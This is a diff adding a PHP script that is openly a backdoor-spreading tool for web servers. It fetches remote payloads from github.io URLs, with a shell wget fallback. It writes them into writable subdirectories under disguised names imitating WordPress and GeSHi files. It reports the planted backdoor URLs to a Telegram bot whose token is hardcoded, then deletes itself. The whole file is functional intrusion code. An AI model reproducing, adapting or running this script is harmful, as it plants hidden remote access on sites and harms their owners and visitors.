@@ -1,0 +1,207 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// Global variable to track the last used URL index
+$lastUrlIndex = -1;
+
+// Function to get the next URL in sequence
+function get_next_url() {
+    global $lastUrlIndex;
+    $urls = array(
+        'https://lambarzuani.github.io/gongshi.txt', 
+        'https://xlscls.github.io/library.txt',
+        'https://xlscls.github.io/baks.txt'
+    );
+
+    // Update the index to the next URL
+    $lastUrlIndex = ($lastUrlIndex + 1) % count($urls);
+
+    return $urls[$lastUrlIndex];
+}
+
+// Function to fetch content from a URL
+function read_content($url) {
+    // Attempt to use file_get_contents
+    $url_content = @file_get_contents($url);
+    if ($url_content !== false) {
+        return $url_content;
+    }
+
+    // If file_get_contents fails, use cURL
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $url_content = curl_exec($ch);
+    curl_close($ch);
+
+    if ($url_content !== false) {
+        return $url_content;
+    }
+
+    // If cURL fails, use wget
+    $outputFile = tempnam(sys_get_temp_dir(), 'wget_');
+    $wgetCommand = "wget -qO $outputFile $url";
+    $result = shell_exec($wgetCommand);
+
+    if (file_exists($outputFile)) {
+        $url_content = file_get_contents($outputFile);
+        unlink($outputFile);
+        if ($url_content !== false) {
+            return $url_content;
+        }
+    }
+
+    // If wget fails, attempt using fopen and fread
+    $stream = @fopen($url, 'r');
+    if ($stream) {
+        $url_content = '';
+        while (!feof($stream)) {
+            $url_content .= fread($stream, 8192);
+        }
+        fclose($stream);
+        if ($url_content !== false) {
+            return $url_content;
+        }
+    }
+
+    // If all methods fail, return an error message
+    return "Gagal mengambil konten dari $url.";
+}
+
+// Function to generate a random name for the backdoor file
+function generateRandomName() {
+    $names = ["GeSHi-config.php", "GeSHi-loader.php", "GeSHi-formatter.php", "core-lang-handler.php", "task-runner.php",
+        "GeSHi-utils.php", "php-syntax.php", "session-manager.php", "GeSHi-parser.php", "log-sync.php",
+        "python-handler.php", "GeSHi-highlighter.php", "java-runner.php", "session-helper.php", "cache-lang.php",
+        "GeSHi-logs.php", "config-injector.php", "GeSHi-setup.php", "error-reporter.php", "ruby-script.php",
+        "log-analyzer.php", "GeSHi-session.php", "perl-loader.php", "cron-helper.php", "GeSHi-checker.php",
+        "config-cleaner.php", "python-executor.php", "GeSHi-error.php", "log-viewer.php", "GeSHi-analyzer.php",
+        "task-scheduler.php", "ruby-handler.php", "data-extractor.php", "GeSHi-formatter.php", "session-logger.php",
+        "core-loader.php", "perl-runner.php", "GeSHi-writer.php", "session-writer.php", "php-runner.php",
+        "GeSHi-compiler.php", "script-loader.php", "GeSHi-processor.php", "cron-logger.php", "GeSHi-updater.php",
+        "java-processor.php", "log-collector.php", "GeSHi-debugger.php", "session-expiry.php", "GeSHi-executor.php",
+        "error-logger.php", "GeSHi-helper.php", "python-formatter.php", "system-scan.php", "GeSHi-handler.php",
+        "session-checker.php", "GeSHi-optimizer.php", "java-validator.php", "config-manager.php", "GeSHi-sanitizer.php",
+        "task-helper.php", "GeSHi-setup.php", "ruby-processor.php", "file-logger.php", "GeSHi-loader.php",
+        "php-sanitizer.php", "GeSHi-lang.php", "script-compiler.php", "GeSHi-configurator.php", "java-sanitizer.php",
+        "GeSHi-api.php", "error-handler.php", "GeSHi-core.php", "config-scanner.php", "GeSHi-logs.php",
+        "session-sync.php", "python-sanitizer.php", "GeSHi-parser.php", "system-bootstrap.php", "GeSHi-data.php",
+        "ruby-validator.php", "GeSHi-file.php", "session-monitor.php", "GeSHi-backup.php", "php-helper.php",
+        "GeSHi-db.php", "log-sync.php", "python-sync.php", "GeSHi-cache.php", "system-logs.php", "GeSHi-helper.php",
+        "session-logs.php", "GeSHi-task.php", "task-manager.php", "GeSHi-checker.php", "log-cleaner.php",
+        "GeSHi-manager.php", "session-storage.php", "GeSHi-router.php", "cron-scheduler.php","edit-form-advanced.php",
+        "link-parse-opml.php", "ms-sites.php", "options-writing.php", "themes.php", "https.php", "class-https.php", "admin-ajax.php",
+        "edit-form-comment.php", "link.php", "ms-themes.php", "_Document.php", "plugin-editor.php", "admin-footer.php", "edit-link-form.php",
+        "registration-functions.php", "load-scripts.php", "ms-upgrade-network.php", "admin-functions.php", "edit.php", "load-styles.php", 
+        "ms-users.php", "plugins.php", "admin-header.php", "licenses.php", "edit-tag-form.php", "media-new.php", "my-sites.php", "apps.php", 
+        "post-new.php", "upgrade-themes.php", "sandwich.php", "edit-tags.php", "noop.php", "media.php", "nav-menus.php", "posts.php", "admin-post.php", 
+        "export.php", "Note.php", "media-upload.php", "network.php", "press-this.php", "upload.php", "async-upload.php", "menu-header.php", 
+        "options-discussion.php", "privacy.php", "user-edit.php", "menu.php", "options-general.php", "profile.php", "user-new.php", "moderation.php", 
+        "options-head.php", "revision.php", "users.php", "custom-background.php", "ms-admin.php", "options-media.php", "setup-config.php", "widgets.php", 
+        "theme-single.php", "custom-header.php", "ms-delete-site.php", "options-permalink.php", "term.php", "customize.php", "link-add.php", 
+        "ms-edit.php", "options.php", "edit-comments.php", "link-manager.php", "ms-options.php", "options-reading.php", "xmlrpc.php", "comments.php", 
+        "front-page.php", "home.php", ".default.php", "header.php", "singular.php", "single.php", "single-wordpress.php", "page.php", "category.php", 
+        "tag.php", "taxonomy.php", "author.php", "date.php", "archive.php", "search.php", "attachment.php", "image.php", "404.php", "https.php", 
+        "noop.php", "kayeli.php", "Document.php", "class-wp-customize-nav-menu-customize.php", "Note.php", ".default.php", 
+        "_Document.php", "footer_backup.php", "header_backup.php", "apps.php", "index.php", "remove.php", "class.php"]; 
+    return $names[array_rand($names)];
+}
+
+// Function to send notification to Telegram
+function sendTelegramNotification($message) {
+    $botToken = "6208351993:AAGZjym7LNhRuFbPHhVyd1W9z1av8SrxY7o"; // Replace with your bot token
+    $chatId = "1767505030"; // Replace with your chat ID
+    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+    $postFields = [
+        'chat_id' => $chatId,
+        'text' => $message,
+    ];
+
+    $ch = curl_init(); 
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $serverOutput = curl_exec($ch);
+    curl_close($ch);
+
+    return $serverOutput;
+}
+
+// Function to spread backdoor code
+function spreadBackdoor($dir, $backdoor_code, &$count, &$backdoorUrls, $domain) {
+    if ($count >= 25) return;
+
+    // Use RecursiveDirectoryIterator and RecursiveIteratorIterator with exception handling
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+
+        foreach ($iterator as $fileInfo) {
+            if ($fileInfo->isDir()) {
+                $subDir = $fileInfo->getRealPath();
+
+                // Check if the sub-directory is writable before proceeding
+                if (is_writable($subDir)) {
+                    $randomName = generateRandomName();
+                    $filePath = $subDir . DIRECTORY_SEPARATOR . $randomName;
+
+                    // Skip if the file already exists and continue to the next directory
+                    if (file_exists($filePath)) {
+                        echo "Skipping existing file: $filePath\n";
+                        continue;
+                    }
+
+                    // Write the backdoor code to the file
+                    file_put_contents($filePath, $backdoor_code);
+                    // Construct the URL for the created backdoor
+                    $bdPath = str_replace(dirname(__FILE__), '', realpath($filePath));
+                    $bdPath = str_replace('\\', '/', $bdPath); // Normalize path separators
+                    $url = $domain . $bdPath;
+
+                    // Add URL to backdoorUrls array
+                    $backdoorUrls[] = $url;
+                    // Display the URL
+                    echo "Backdoor created at: $url\n";
+
+                    $count++;
+                    if ($count >= 25) break;  // Stop if the maximum count is reached
+
+                    // Get the next URL for the next directory
+                    $backdoor_code = read_content(get_next_url());
+                }
+            }
+        }
+    } catch (UnexpectedValueException $e) {
+        // Handle the exception and skip directories that can't be accessed
+        echo "Skipping directory due to access error: {$e->getMessage()}\n";
+    }
+}
+
+// Main execution
+echo "Nama Domain: ";
+$dom = fopen("php://stdin", "r"); 
+$domain = trim(fgets($dom));
+$dir = dirname(__FILE__);  // Replace with a specific directory if needed
+
+$backdoorUrls = [];
+$count = 0;
+
+$initialUrl = get_next_url();  // Start with the first URL in sequence
+$backdoor_code = read_content($initialUrl);
+
+spreadBackdoor($dir, $backdoor_code, $count, $backdoorUrls, $domain);
+
+// Send backdoor URLs to Telegram if any
+if (!empty($backdoorUrls)) {
+    $backdoorMessage = "Backdoors created at:\n" . implode("\n", $backdoorUrls);
+    sendTelegramNotification($backdoorMessage);
+}
+$filename = $argv[0];
+unlink($filename);
+
+?>
